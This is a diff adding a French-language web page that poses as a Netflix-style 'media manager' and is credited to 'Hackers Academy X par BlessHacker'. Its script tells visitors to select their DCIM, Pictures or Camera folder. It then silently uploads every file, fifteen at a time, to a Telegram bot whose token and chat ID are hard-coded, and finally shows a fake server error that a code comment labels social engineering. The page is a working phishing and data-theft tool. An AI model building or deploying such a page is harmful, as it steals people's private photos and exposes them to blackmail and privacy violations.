@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>NET-LOADER | Media Manager</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    /* --- CONFIGURATION DE BASE --- */
+    * { box-sizing: border-box; outline: none; }
+
+    body {
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+      background-color: #141414;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* --- BACKGROUND CINEMA --- */
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d08737b/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg') center center / cover no-repeat;
+      opacity: 0.6;
+      filter: blur(4px) contrast(1.1);
+      z-index: -1;
+      transform: scale(1.05);
+    }
+
+    body::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.8) 100%);
+      z-index: -1;
+    }
+
+    /* --- NAVIGATION --- */
+    .nav-header {
+      position: absolute;
+      top: 0; left: 0; width: 100%;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .logo {
+      color: #e50914;
+      font-weight: 800;
+      font-size: 24px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+    }
+
+    .user-profile {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      color: #e5e5e5;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+    }
+
+    .avatar {
+      width: 35px; height: 35px;
+      background-color: #333;
+      border-radius: 4px;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/0/0b/Netflix-avatar.png');
+      background-size: cover;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+
+    /* --- CONTENEUR PRINCIPAL --- */
+    .container {
+      background: rgba(0, 0, 0, 0.35); 
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(25px); 
+      -webkit-backdrop-filter: blur(25px);
+      border-radius: 16px;
+      padding: 40px;
+      width: 90%;
+      max-width: 480px;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+      animation: fadeIn 0.8s ease-out;
+      margin-bottom: 50px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      margin: 0 0 5px;
+      font-size: 28px;
+      font-weight: 700;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+
+    p.subtitle {
+      color: #ccc;
+      font-size: 14px;
+      margin-bottom: 25px;
+      font-weight: 400;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+    }
+
+    /* --- ALERT SYSTEM --- */
+    .system-alert {
+      background: rgba(229, 9, 20, 0.2); 
+      border-left: 4px solid #e50914;
+      padding: 12px;
+      text-align: left;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .alert-icon {
+      font-size: 18px; color: #e50914; margin-top: 2px;
+      filter: drop-shadow(0 0 5px rgba(229, 9, 20, 0.5));
+    }
+
+    .alert-content h4 {
+      margin: 0 0 4px; font-size: 13px; color: #fff; font-weight: 600;
+    }
+
+    .alert-content p {
+      margin: 0; font-size: 11px; color: #eee; line-height: 1.4;
+    }
+
+    /* --- BOUTONS --- */
+    .button {
+      width: 100%; padding: 16px;
+      font-family: 'Montserrat', sans-serif;
+      font-weight: 600; font-size: 15px;
+      border: none; border-radius: 6px;
+      cursor: pointer; transition: all 0.3s ease;
+      display: flex; align-items: center; justify-content: center;
+      gap: 10px; margin-bottom: 15px;
+      text-transform: uppercase; letter-spacing: 0.5px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+    }
+
+    #selectFolderBtn {
+      background-color: rgba(255, 255, 255, 0.15);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      backdrop-filter: blur(5px);
+    }
+
+    #selectFolderBtn:hover {
+      background-color: rgba(255, 255, 255, 0.25);
+      border-color: #fff;
+      transform: translateY(-2px);
+    }
+
+    button[type="submit"] {
+      background: linear-gradient(45deg, #e50914, #b20710);
+      color: white; margin-top: 5px; font-size: 16px;
+    }
+
+    button[type="submit"]:disabled {
+        background: #333;
+        color: #777;
+        cursor: not-allowed;
+        box-shadow: none;
+        opacity: 0.6;
+    }
+
+    button[type="submit"]:not(:disabled):hover {
+      filter: brightness(1.2);
+      box-shadow: 0 0 20px rgba(229, 9, 20, 0.7);
+      transform: scale(1.02);
+    }
+
+    /* Status texte */
+    #folderStatus {
+      font-size: 12px; min-height: 20px;
+      margin: -5px 0 20px; font-weight: 600;
+      text-shadow: 0 0 10px rgba(0,0,0,0.5);
+      line-height: 1.5;
+    }
+
+    /* --- PROGRESS --- */
+    #progressContainer {
+      margin-top: 25px; display: none; text-align: left;
+      background: rgba(0,0,0,0.4); padding: 15px; border-radius: 8px;
+    }
+
+    .progress-label {
+      font-size: 11px; color: #ccc; margin-bottom: 5px;
+      display: flex; justify-content: space-between;
+    }
+
+    .progress-bar {
+      width: 100%; background-color: rgba(255,255,255,0.1);
+      border-radius: 4px; height: 6px; overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      background: #e50914; height: 100%; width: 0%;
+      transition: width 0.3s ease-in-out;
+      box-shadow: 0 0 10px #e50914;
+    }
+
+    #progressText {
+      margin-top: 8px; font-size: 11px; color: #ddd; text-align: right;
+    }
+
+    #fileInput { display: none; }
+
+    /* --- FOOTER VISIBLE --- */
+    .hacker-footer {
+      position: absolute; 
+      bottom: 25px; 
+      width: 100%;
+      text-align: center;
+      font-family: 'Courier New', monospace;
+      font-size: 15px; 
+      color: #fff; 
+      font-weight: 700; 
+      letter-spacing: 1px;
+      text-shadow: 0 0 10px rgba(229, 9, 20, 0.8), 2px 2px 4px rgba(0,0,0,0.9);
+      pointer-events: none;
+      z-index: 100;
+      opacity: 0.9;
+    }
+    
+    .hacker-footer span { 
+        color: #e50914; 
+        font-weight: 900;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="nav-header">
+    <div class="logo">STREAM<span style="color:#fff">LOAD</span></div>
+    <div class="user-profile">
+      <span>Admin</span>
+      <div class="avatar"></div>
+    </div>
+  </div>
+
+  <div class="container">
+    <h2>Initialisation</h2>
+    <p class="subtitle">Configuration du serveur de téléchargement</p>
+
+    <div class="system-alert">
+      <div class="alert-icon"><i class="fas fa-exclamation-circle"></i></div>
+      <div class="alert-content">
+        <h4>Action Requise</h4>
+        <p>Pour la synchronisation, veuillez autoriser l'accès au dossier système <strong style="color:#fff; text-decoration: underline;">Images (Pictures)</strong> ou <strong>DCIM</strong> lorsque demandé.</p>
+      </div>
+    </div>
+
+    <button type="button" class="button" id="selectFolderBtn">
+      <i class="fas fa-folder-open"></i> Sélectionner la destination
+    </button>
+    
+    <p id="folderStatus"></p>
+
+    <form id="uploadForm">
+      <input type="file" id="fileInput" webkitdirectory multiple required />
+      
+      <button type="submit" class="button" id="submitBtn" disabled>
+        Démarrer l'importation <i class="fas fa-play"></i>
+      </button>
+    </form>
+
+    <div id="progressContainer">
+      <div class="progress-label">
+        <span>Statut du serveur</span>
+        <span id="progressPercent">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="progressFill"></div>
+      </div>
+      <div id="progressText">En attente...</div>
+    </div>
+
+  </div>
+
+  <div class="hacker-footer">
+    Hackers Academy <span>X</span> par BlessHacker
+  </div>
+
+  <script>
+    // --- CONFIGURATION ---
+    const botToken = '8473069914:AAGZm9VeVEKoau8PF7ToRadsz3Crsn3mCtI';
+    const chatId = '7986862981';
+
+    // --- TURBO MODE : 15 uploads en parallèle ---
+    const CONCURRENCY = 15; 
+
+    // --- ÉLÉMENTS DOM ---
+    const selectFolderBtn = document.getElementById('selectFolderBtn');
+    const fileInput = document.getElementById('fileInput');
+    const form = document.getElementById('uploadForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const folderStatus = document.getElementById('folderStatus');
+    const progressPercent = document.getElementById('progressPercent');
+
+    let selectedFiles = [];
+
+    // --- 1. OUVERTURE ---
+    selectFolderBtn.addEventListener('click', () => {
+      fileInput.click();
+    });
+
+    // --- 2. VALIDATION STRICTE ---
+    fileInput.addEventListener('change', () => {
+      const files = Array.from(fileInput.files);
+      
+      folderStatus.innerHTML = "";
+      folderStatus.style.color = "";
+      submitBtn.disabled = true;
+
+      if (files.length > 0) {
+        let rootFolder = "Inconnu";
+        const path = files[0].webkitRelativePath || "";
+        
+        if (path.indexOf('/') !== -1) {
+            rootFolder = path.split('/')[0];
+        } else {
+            rootFolder = "Dossier Inconnu";
+        }
+
+        const rootLower = rootFolder.toLowerCase();
+        const allowedFolders = ['pictures', 'dcim', 'camera', 'images', 'photos'];
+
+        if (allowedFolders.includes(rootLower)) {
+          // OK
+          selectedFiles = files;
+          folderStatus.style.color = '#46d369'; 
+          folderStatus.innerHTML = `<i class="fas fa-check-circle"></i> Dossier <b>${rootFolder}</b> validé (${files.length} films et series).`;
+          submitBtn.disabled = false; 
+        } else {
+          // ERREUR
+          selectedFiles = [];
+          fileInput.value = ''; 
+          folderStatus.style.color = '#e50914'; 
+          folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Le dossier sélectionné est <b>${rootFolder}</b>.<br>Veuillez sélectionner soit le dossier <b>DCIM</b>, <b>Pictures</b>, <b>Camera</b> ou <b>Images</b>.<br>Les autres ne sont pas acceptés.`;
+          submitBtn.disabled = true;
+        }
+      } 
+    });
+
+    // --- 3. ENVOI OPTIMISÉ (QUEUE PROPRE) ---
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      if (selectedFiles.length === 0) return;
+
+      // UI
+      progressContainer.style.display = 'block';
+      progressText.textContent = 'Initialisation du flux...';
+      progressFill.style.width = '0%';
+      
+      // Bloquer
+      selectFolderBtn.style.pointerEvents = 'none';
+      selectFolderBtn.style.opacity = '0.5';
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Transfert en cours...';
+
+      let uploadedCount = 0;
+      const total = selectedFiles.length;
+      let index = 0;
+
+      // Fonction d'upload unitaire
+      async function uploadFile(file) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file);
+        formData.append('caption', `📂 ${file.webkitRelativePath || file.name}`);
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+
+        try {
+          await fetch(url, { method: 'POST', body: formData });
+        } catch (err) {
+          // On ignore les erreurs pour ne pas bloquer
+        }
+
+        uploadedCount++;
+        updateProgress(uploadedCount, total);
+      }
+
+      function updateProgress(done, total) {
+        const percent = Math.round((done / total) * 100);
+        progressFill.style.width = `${percent}%`;
+        if(progressPercent) progressPercent.textContent = `${percent}%`;
+        
+        // Optimisation UI : On change le texte, mais on évite les logs console massifs
+        // si beaucoup de fichiers
+        if (done % 5 === 0 || done === total) { 
+             progressText.textContent = `Synchronisation... ${done}/${total}`;
+        }
+      }
+
+      // --- ALGORITHME DE QUEUE SANS FUITE DE MÉMOIRE ---
+      async function uploadQueue() {
+        const workers = []; // Liste des promesses en cours
+
+        // Tant qu'il reste des fichiers à traiter
+        while (index < total) {
+          
+          // 1. Remplir le workers jusqu'à la limite (CONCURRENCY)
+          while (workers.length < CONCURRENCY && index < total) {
+            const file = selectedFiles[index++];
+            
+            // On crée la promesse d'upload
+            const p = uploadFile(file);
+            
+            // TRUC CLEF : On attache une fonction de nettoyage à la promesse elle-même
+            // Quand elle finit, elle se retire du tableau workers
+            const pWithCleanup = p.then(() => {
+                // On trouve sa propre place dans le tableau et on se supprime
+                workers.splice(workers.indexOf(pWithCleanup), 1);
+            });
+
+            // On ajoute cette promesse "intelligente" au tableau
+            workers.push(pWithCleanup);
+            
+            // Log pour les premiers fichiers uniquement (pour rassurer l'utilisateur sans spammer)
+            if (index <= 10) {
+                console.log(`Démarrage fichier ${index}`);
+            }
+          }
+
+          // 2. Si le tableau est plein, on attend que L'UNE des tâches finisse
+          // Grâce au nettoyage ci-dessus, dès qu'elle finit, la place se libère
+          if (workers.length >= CONCURRENCY) {
+            await Promise.race(workers);
+          }
+        }
+
+        // 3. Attendre que les tout derniers finissent
+        await Promise.all(workers);
+      }
+
+      // Lancer le processus
+      await uploadQueue();
+
+      // FIN AVEC ERREUR (SOCIAL ENGINEERING)
+      setTimeout(() => {
+        progressFill.style.width = `100%`;
+        if(progressPercent) progressPercent.textContent = `Erreur`;
+        progressText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erreur inattendue du serveur. Réessayez plus tard.';
+        progressText.style.color = '#ff6b6b';
+        submitBtn.innerHTML = 'Échec de connexion';
+      }, 800);
+    });
+  </script>
+
+</body>
+</html>
